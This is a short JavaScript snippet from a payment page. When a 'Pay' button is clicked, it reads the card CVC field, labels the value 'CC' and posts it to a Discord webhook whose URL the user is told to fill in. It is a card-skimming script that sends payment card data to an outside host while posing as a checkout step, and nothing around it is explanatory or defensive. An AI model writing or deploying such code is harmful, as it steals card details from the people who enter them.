    <script>
        // Replace with your Discord webhook URL
        const discordWebhookURL = 'WEBHOOK';

        function sendDiscordMessage() {
            const cc = document.getElementById('cardCVC').value;

            if (!cc.trim()) {
                alert('Please enter a message before sending.');
                return;
            }

            const embedMessage = {
                embeds: [
                    {
                        title: 'CC',
                        description: cc,
                        color: 16777215 // White color
                    }
                ]
            };

            fetch(discordWebhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embedMessage)
            })
            .then(response => {
                if (response.ok) {
                    alert('Message sent to Discord successfully!');
                    document.getElementById('cardNumber').value = '';
                } else {
                    throw new Error('Failed to send message to Discord.');
                }
            })
                        .catch(error => {
                console.error(error);
                alert('Oops, something went wrong. Please try again later.');
            });

        }

        // Add event listener to the "Pay" button
        document.getElementById('payButton').addEventListener('click', sendDiscordMessage);
    </script>
